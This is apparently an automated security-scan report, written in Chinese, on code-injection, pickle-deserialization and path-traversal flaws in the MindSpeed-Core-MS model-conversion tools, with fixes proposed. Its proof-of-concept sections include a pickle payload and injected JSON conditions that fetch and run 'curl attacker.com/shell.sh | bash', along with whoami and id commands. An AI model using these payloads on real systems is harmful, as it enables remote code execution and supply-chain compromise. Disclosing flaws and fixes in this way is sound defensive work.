# 漏洞扫描报告 — 已确认漏洞

**项目**: MindSpeed-Core-MS  
**扫描时间**: 2026-04-20T12:00:00Z  
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

本次安全扫描针对 MindSpeed-Core-MS 项目（一个 PyTorch 到 MindSpore 模型代码转换框架）发现了 **9 个已确认的安全漏洞**，其中 **3 个为 Critical 级别**。该项目的主要安全风险集中在代码注入和反序列化漏洞，这些漏洞可能被攻击者利用来执行任意代码或控制受影响的系统。

**关键发现**：
- **代码注入漏洞 (CWE-94)**：Patch 合并工具 (`tools/convert/patch_merge`) 中存在多处代码注入漏洞，攻击者可通过构造恶意 JSON 配置文件注入任意 Python 代码到目标源文件
- **反序列化漏洞 (CWE-502)**：权重加载工具 (`tools/load_ms_weights_to_pt`) 使用不安全的 pickle 反序列化，存在任意代码执行风险
- **路径遍历漏洞 (CWE-22/73)**：多个 CLI 工具未对用户输入的路径参数进行验证，可能导致任意文件读写/删除

**业务影响**：
- 供应链攻击风险：恶意构造的权重文件或 patch 配置文件可导致 RCE，影响下游使用该项目进行模型转换的团队
- CI/CD 管道安全：如果漏洞代码在自动化构建环境中执行，可能导致构建环境被控制
- 数据泄露风险：路径遍历漏洞可能导致敏感配置文件或训练数据泄露

**建议优先修复方向**：
1. **立即修复 Critical 级别漏洞**：优先处理 VULN-001-94、VULN-002-94 和 pickle 反序列化漏洞
2. **限制工具执行环境**：建议在隔离容器或沙箱环境中运行代码转换工具
3. **输入验证加固**：对所有 JSON 配置文件和文件路径参数添加白名单验证

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| CONFIRMED | 9 | 37.5% |
| LIKELY | 8 | 33.3% |
| FALSE_POSITIVE | 5 | 20.8% |
| POSSIBLE | 2 | 8.3% |
| **总计** | **24** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 3 | 33.3% |
| **有效漏洞总计** | **9** | - |
| 误报 (FALSE_POSITIVE) | 5 | - |

### 1.3 Top 10 关键漏洞

1. **[VULN-001-94]** Code Injection (Critical) - `tools/convert/patch_merge/modules/merge.py:610` @ `merge` | 置信度: 85
2. **[VULN-002-94]** Code Injection via Expression Parsing (Critical) - `tools/convert/patch_merge/modules/patch_func_router.py:44` @ `_merged_branch_builder` | 置信度: 85
3. **[tools_load_weights-CWE502-pickle-deser-001]** Pickle Deserialization (Critical) - `tools/load_ms_weights_to_pt/serialization.py:384` @ `load_ms_weights` | 置信度: 85
4. **[VULN-tools_convert-path_traversal-001]** Path Traversal (HIGH) - `tools/convert/modules/utils.py:77` @ `FileConverter.convert` | 置信度: 85
5. **[2762056b-9cfb-4aef-99fa-8f113cccb7be]** Path Traversal - Arbitrary File Deletion (HIGH) - `tools/transfer.py:79` @ `convert_special_rules_by_line` | 置信度: 85
6. **[966c37c9-21bb-46fd-a062-1ca289fe4759]** Missing Path Validation (MEDIUM) - `tools/transfer.py:166` @ `main` | 置信度: 85
7. **[VULN-src_mindspeed_mm-pickle_deserialization-001]** Pickle Deserialization (HIGH) - `src/mindspeed_mm/mindspore/data/datasets/feature_dataset.py:10` @ `get_data_from_feature_data` | 置信度: 85
8. **[ac953a5d-3ca3-4f4f-98e6-da71a5653c9a]** Path Traversal - Arbitrary File Write (HIGH) - `tools/transfer.py:43` @ `convert_general_rules` | 置信度: 80
9. **[6a80cc11-9a30-43b4-8ea3-92573d02b55f]** Path Traversal - Arbitrary File Write (HIGH) - `tools/transfer.py:68` @ `convert_special_rules` | 置信度: 80

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `main@tools/convert/convert.py` | cmdline | untrusted_local | CLI工具入口，接收用户通过命令行传入的--path_to_change参数，该路径指向需要转换的代码目录或文件。本地用户可以控制此参数，可能传入恶意路径或包含恶意代码的文件。 | 代码转换工具CLI入口，处理PyTorch到MSAdapter的API映射 |
| `main@tools/transfer.py` | cmdline | untrusted_local | CLI工具入口，接收多个路径参数（megatron_path、mindspeed_path、mindspeed_llm_path等），这些路径由用户在命令行指定。本地用户可以控制这些参数，可能传入恶意路径。 | 代码转换工具CLI入口，基于规则进行代码替换 |
| `main@tools/load_ms_weights_to_pt/transfer.py` | cmdline | untrusted_local | CLI工具入口，接收mindspeed_llm_path参数，用于将权重转换工具复制到目标目录。本地用户可以控制此参数。 | 权重加载工具CLI入口，复制checkpointing.py和serialization.py到目标目录 |
| `main@tools/convert/patch_merge/modules/merge.py` | cmdline | untrusted_local | Patch合并工具CLI入口，接收root-dir和json-file参数。本地用户可以控制路径和JSON文件内容，可能触发不安全的代码操作。 | Patch合并工具CLI入口，将patch JSON合并到源代码 |
| `load_ms_weights@tools/load_ms_weights_to_pt/serialization.py` | file | untrusted_local | 权重加载函数，接收文件路径参数f，使用pickle进行反序列化。如果用户传入恶意构造的.pt文件，可能导致任意代码执行。 | 权重加载函数，从.pt文件加载MindSpore权重 |
| `get_data_from_feature_data@src/mindspeed_mm/mindspore/data/datasets/feature_dataset.py` | file | untrusted_local | 特征数据加载函数，使用torch.load加载用户指定的.pt文件。torch.load内部使用pickle反序列化，存在任意代码执行风险。 | 特征数据加载函数，从.pt文件加载特征数据 |
| `load_json_file@tools/convert/modules/api_transformer.py` | file | untrusted_local | JSON配置文件加载函数，从api_mapping.json读取API映射配置。如果该文件被篡改，可能导致不安全的API映射。 | JSON配置文件加载函数，读取API映射配置 |

**其他攻击面**:
- CLI Interface: tools/convert/convert.py --path_to_change参数
- CLI Interface: tools/transfer.py 多个路径参数
- CLI Interface: tools/load_ms_weights_to_pt/transfer.py --mindspeed_llm_path参数
- CLI Interface: tools/convert/patch_merge/modules/merge.py --root-dir和--json-file参数
- Pickle Deserialization: tools/load_ms_weights_to_pt/serialization.py load_ms_weights函数
- Pickle Deserialization: src/mindspeed_mm/mindspore/data/datasets/feature_dataset.py torch.load调用
- File Read: tools/convert/modules/api_transformer.py api_mapping.json配置文件

---

## 3. Critical 漏洞 (3)

### [VULN-001-94] Code Injection - merge

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `tools/convert/patch_merge/modules/merge.py:610-657` @ `merge`
**模块**: tools_patch_merge

**描述**: JSON configuration file controls code injection through multiple libcst.parse_statement() calls. Attacker-controlled patch_import, condition, and origin_import fields from JSON are directly used to construct and parse Python code statements without validation. This allows arbitrary code injection into source files being modified.

**漏洞代码** (`tools/convert/patch_merge/modules/merge.py:610-657`)

```c
with open(patch_json, "r", encoding="utf-8") as f:
    raw_patches = json.load(f)
pm = PatchMerger(raw_patches, root_dir)
```

**达成路径**

args.json_file@merge.py:715 -> json.load@617 -> raw_patches -> parse_patch_infos@619 -> libcst.parse_statement(patch_import)@patch_func_router.py:67 -> libcst.parse_expression(condition)@patch_func_router.py:69 -> flush_cst_into_file@143 [SINK: code_write]

**验证说明**: Direct external input (JSON file) controls libcst.parse_statement() calls. Attacker can inject arbitrary Python code through patch_import and condition fields. No validation or sanitization. Code is written to source files that will be executed when imported.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: 
该漏洞的根本原因是 `merge()` 函数在处理 patch JSON 配置文件时，将外部输入的数据直接传递给 `PatchMerger` 类，而未进行任何安全验证。关键代码位于 `merge.py:614-619`：

```python
# merge.py:614-619
patch_json = Path(json_file)
with open(patch_json, 'r', encoding='utf-8') as f:
    raw_patches = json.load(f)  # ⚠️ 外部输入，无验证
pm = PatchMerger(raw_patches, root_dir)
pm.parse_patch_infos()  # 解析过程会调用 libcst.parse_statement()
```

`parse_patch_infos()` 内部会调用 `_merged_branch_builder()` (在 `patch_func_router.py` 中)，该函数将 JSON 中的 `patch_import` 和 `condition` 字段直接用于构建 Python 代码语句。

**潜在利用场景**:
1. **供应链攻击**: 攻击者在公开仓库发布包含恶意 patch JSON 的配置文件，用户下载后执行 merge 工具触发代码注入
2. **内部威胁**: 内部人员修改 patch JSON 配置，注入恶意代码到正在转换的源文件中
3. **CI/CD 管道**: 自动化代码转换流程中加载恶意配置，导致构建环境被控制

**攻击示例 PoC**:
```json
{
  "target_module": {
    "condition": ["__import__('os').system('curl attacker.com/shell.sh | bash')"],
    "patch_import": "os.system as malicious"
  }
}
```
当执行 `python merge.py --root-dir /target --json-file malicious.json` 时，恶意代码会被写入源文件。

**建议修复方式**:
1. 添加 JSON schema 验证，限制允许的字段和格式
2. 对 `patch_import` 添加模块路径白名单验证
3. 禁止 `condition` 字段包含任意表达式，改用预定义的条件模板
4. 在沙箱环境中执行代码解析操作

---

### [VULN-002-94] Code Injection via Expression Parsing - _merged_branch_builder

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `tools/convert/patch_merge/modules/patch_func_router.py:44-73` @ `_merged_branch_builder`
**模块**: tools_patch_merge

**描述**: Attacker-controlled condition field from JSON is directly parsed as Python expression using libcst.parse_expression(). This allows injection of arbitrary Python expressions that will be embedded in generated routing functions.

**漏洞代码** (`tools/convert/patch_merge/modules/patch_func_router.py:44-73`)

```c
condition = condition.replace("args", "global_args")
test=cst.parse_expression(condition)
```

**达成路径**

args.json_file -> json.load -> raw_patches -> patch_info["condition"] -> cst.parse_expression(condition) [SINK: code_injection]

**验证说明**: JSON-controlled condition field directly parsed as Python expression via cst.parse_expression() without validation. Arbitrary expressions injected into routing functions.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**:
该漏洞的根本原因是 `_merged_branch_builder()` 函数将 JSON 配置中的 `condition` 字段直接传递给 `cst.parse_expression()` 进行解析，允许任意 Python 表达式注入。关键代码位于 `patch_func_router.py:62-69`：

```python
# patch_func_router.py:62-69
condition = condition.replace("args", "global_args")
patch_import_module = '.'.join(patch_import.split(".")[:-1])
patch_import_func = patch_import.split(".")[-1]

new_import = cst.parse_statement(f"from {patch_import_module} import {patch_import_func} as {patch_call_name}")
current_node = cst.If(
    test=cst.parse_expression(condition),  # ⚠️ 直接解析用户输入
    ...
)
```

`condition` 字段被转换为 Python 表达式并嵌入生成的路由函数中。解析后的代码会写入目标源文件，当源文件被导入执行时触发。

**潜在利用场景**:
1. **恶意表达式注入**: 攻击者构造 `condition` 为 `"__import__('subprocess').Popen(['bash', '-c', 'id'])"` 或 `"exec(open('/etc/passwd').read())"`
2. **import 路径篡改**: 通过 `patch_import` 字段导入恶意模块，如 `"os.system as helper"`
3. **逻辑绕过**: 构造条件表达式使恶意分支总是被执行

**攻击示例 PoC**:
```json
{
  "module.py": [{
    "condition": ["True or __import__('os').system('whoami')"],
    "patch_import": "builtins.exec"
  }]
}
```
生成的路由代码：
```python
if True or __import__('os').system('whoami'):  # 永远为 True，且执行 system()
    from builtins import exec as malicious_func
    return malicious_func(...)
```

**建议修复方式**:
1. 使用预定义的条件模板（如 `"args.vocab_size > 1000"`），禁止任意表达式
2. 对条件表达式进行 AST 检查，只允许简单的比较运算符和属性访问
3. 将 `condition` 解析限制为安全的字符串匹配模式
4. 在生成代码前进行安全审计检查

---

### [tools_load_weights-CWE502-pickle-deser-001] Pickle Deserialization - load_ms_weights

**严重性**: Critical | **CWE**: CWE-502 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `tools/load_ms_weights_to_pt/serialization.py:384-527` @ `load_ms_weights`
**模块**: tools_load_weights

**描述**: Unsafe pickle deserialization in load_ms_weights(). The function accepts a file path argument f and deserializes it using pickle. The UnpicklerWrapper only restricts torch modules but allows arbitrary class loading for other modules via super().find_class(), enabling potential RCE if a malicious .pt file is provided.

**漏洞代码** (`tools/load_ms_weights_to_pt/serialization.py:384-527`)

```c
def load_ms_weights(f, map_location=None, pickle_module=pickle, *, weights_only=False, mmap=None, **pickle_load_args):
    ...
    unpickler = UnpicklerWrapper(data_file, **pickle_load_args)
    unpickler.persistent_load = persistent_load
    result = unpickler.load()
```

**达成路径**

f@serialization.py:384 -> _open_file_like@serialization.py:65 -> _is_zipfile@serialization.py:76 -> _load@serialization.py:428 -> UnpicklerWrapper.load@serialization.py:527 [SINK: pickle_deserialization]

**验证说明**: UnpicklerWrapper.find_class() only restricts torch modules. For other modules (os, subprocess, builtins, etc.), super().find_class() allows arbitrary class loading enabling RCE. No weights_only=True enforcement, no allowlist for safe classes.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**:
该漏洞的根本原因是 `UnpicklerWrapper.find_class()` 方法虽然对 torch 相关模块做了限制，但对其他所有模块允许任意类加载。关键代码位于 `serialization.py:512-520`：

```python
# serialization.py:512-520
class UnpicklerWrapper(pickle_module.Unpickler):
    def find_class(self, mod_name, name):
        if mod_name == 'torch._utils':
            return get_func_by_name(name)
        if mod_name == 'torch':
            return str(name)
        if mod_name == 'torch._tensor':
            return get_func_by_name(name)
        mod_name = load_module_mapping.get(mod_name, mod_name)
        return super().find_class(mod_name, name)  # ⚠️ 允许任意类加载
```

当 pickle 数据中包含非 torch 模块的类引用时（如 `os.system`, `subprocess.Popen`），会直接通过 `super().find_class()` 加载，导致任意代码执行。

**潜在利用场景**:
1. **恶意权重文件**: 攻击者构造包含恶意 payload 的 `.pt` 文件，当用户加载权重时触发 RCE
2. **供应链攻击**: 在公开模型仓库发布包含恶意代码的预训练权重，影响下游使用者
3. **数据集投毒**: 通过 `FeatureDataset` 加载恶意特征数据文件（见关联漏洞 VULN-src_mindspeed_mm-pickle_deserialization-001）
4. **间接触发**: 通过 `load_wrapper` 装饰器间接调用（见关联漏洞 tools_load_weights-CWE502-indirect-pickle-001）

**攻击示例 PoC**:
```python
import pickle, os, zipfile

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

# 构造恶意 .pt 文件
with zipfile.ZipFile('malicious.pt', 'w') as zf:
    zf.writestr('data.pkl', pickle.dumps({'__exploit__': MaliciousPayload()}))
    zf.writestr('byteorder', b'little')

# 触发漏洞
from tools.load_ms_weights_to_pt.serialization import load_ms_weights
load_ms_weights('malicious.pt')  # → RCE
```

**建议修复方式**:
1. **白名单机制**: 在 `UnpicklerWrapper.find_class()` 中添加安全模块白名单，拒绝非白名单模块的类加载
2. **weights_only 强制**: 强制使用 `weights_only=True` 参数（PyTorch 2.0+），只允许加载张量数据
3. **格式迁移**: 建议使用 `safetensors` 格式代替 pickle 格式的权重文件
4. **文件签名验证**: 对加载的权重文件进行哈希校验或签名验证

---

## 4. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| src_mindspeed_mm | 0 | 0 | 0 | 0 | 0 |
| tools_convert | 0 | 0 | 0 | 0 | 0 |
| tools_load_weights | 1 | 0 | 0 | 0 | 1 |
| tools_patch_merge | 2 | 0 | 0 | 0 | 2 |
| tools_transfer | 0 | 0 | 0 | 0 | 0 |
| **合计** | **3** | **0** | **0** | **0** | **3** |

## 5. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-22 | 4 | 44.4% |
| CWE-94 | 2 | 22.2% |
| CWE-502 | 2 | 22.2% |
| CWE-73 | 1 | 11.1% |

---

## 6. 修复建议

### 优先级 1: 立即修复 (Critical 漏洞)

**VULN-001-94 & VULN-002-94 - 代码注入漏洞**

1. **添加 JSON Schema 验证**: 定义严格的 patch JSON schema，限制允许的字段类型和格式
   ```python
   PATCH_SCHEMA = {
       "type": "object",
       "properties": {
           "condition": {"type": "array", "items": {"type": "string", "pattern": "^[a-zA-Z0-9_\\.]+$"}},
           "patch_import": {"type": "string", "pattern": "^[a-zA-Z0-9_\\.]+$"}
       }
   }
   ```

2. **限制 import 路径白名单**: 只允许导入已知安全的模块路径
   ```python
   ALLOWED_IMPORTS = ['torch', 'mindspeed', 'megatron', 'transformers']
   def validate_import(patch_import):
       if not any(patch_import.startswith(m) for m in ALLOWED_IMPORTS):
           raise ValueError(f"Unsafe import: {patch_import}")
   ```

3. **禁用任意表达式解析**: 将 `cst.parse_expression(condition)` 改为预定义的条件模板匹配

**tools_load_weights-CWE502-pickle-deser-001 - 反序列化漏洞**

1. **添加白名单机制**: 在 `UnpicklerWrapper.find_class()` 中限制允许的模块
   ```python
   SAFE_MODULES = {'torch', 'torch._utils', 'torch._tensor', 'collections', 'numpy', 'builtins'}
   def find_class(self, mod_name, name):
       if mod_name not in SAFE_MODULES:
           raise RuntimeError(f"Blocked unsafe module: {mod_name}")
   ```

2. **强制 weights_only**: 在调用入口强制使用安全模式
   ```python
   def load_ms_weights(f, ...):
       return _safe_load(f)  # 只加载张量数据，禁止任意对象
   ```

3. **格式迁移**: 建议使用 `safetensors` 格式替代 pickle 格式
   ```python
   from safetensors.torch import load_file
   weights = load_file(filepath)  # 安全的序列化格式
   ```

### 优先级 2: 短期修复 (High 漏洞)

**路径遍历漏洞 (CWE-22/73)**

1. **路径规范化**: 使用 `os.path.realpath()` 解析路径，检测遍历序列
   ```python
   def validate_path(path):
       real_path = os.path.realpath(path)
       if '..' in path or not real_path.startswith(ALLOWED_BASE_DIR):
           raise ValueError(f"Invalid path: {path}")
       return real_path
   ```

2. **白名单目录限制**: 定义允许操作的目录范围
   ```python
   ALLOWED_BASE_DIRS = ['/opt/mindspeed', '/home/user/projects', '/tmp']
   ```

3. **符号链接检测**: 禁止或严格限制符号链接的使用
   ```python
   if os.path.islink(path):
       raise ValueError("Symbolic links are not allowed")
   ```

### 优先级 3: 计划修复 (Medium/Low 漏洞)

**输入验证加固**

1. 对所有 CLI 工具的路径参数添加统一的验证函数
2. 添加输入审计日志，记录所有外部输入的处理过程
3. 在文档中明确说明安全使用注意事项

**架构级改进**

1. **沙箱执行**: 建议在 Docker 容器或 `firejail` 沙箱中运行代码转换工具
2. **权限分离**: 将代码解析、文件写入、权重加载等敏感操作分离到不同模块
3. **安全测试**: 添加针对漏洞的安全测试用例，定期进行回归测试

### 修复时间建议

| 漏洞 | 修复时间 | 备注 |
|------|----------|------|
| Critical (代码注入) | 1-2 周 | 需修改核心逻辑，影响较大 |
| Critical (反序列化) | 2-3 周 | 需设计白名单机制并测试兼容性 |
| High (路径遍历) | 1 周 | 输入验证较简单 |
| Medium/Low | 2-4 周 | 可与其他维护工作并行 |

---

**报告生成**: report-generator + 深度分析整合  
**扫描工具**: Multi-Agent C/C++ & Python Vulnerability Scanner  
**报告版本**: v1.0
